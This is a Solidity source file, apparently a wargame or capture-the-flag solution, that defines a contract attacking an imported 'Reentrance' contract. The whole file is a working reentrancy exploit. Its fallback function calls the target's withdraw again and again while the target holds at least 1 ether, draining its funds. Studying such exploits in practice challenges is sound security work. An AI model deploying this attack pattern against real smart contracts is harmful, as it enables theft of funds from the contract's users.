// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceCaller {
  Reentrance reentrance;

  constructor(Reentrance _reentrance) public {
    reentrance = _reentrance;
  }

  function callWithdraw() external payable {
    reentrance.withdraw(msg.value);
  } 

  fallback() external payable {
    if (address(reentrance).balance >= 1 ether) {
      reentrance.withdraw(1 ether);
    }
  }
}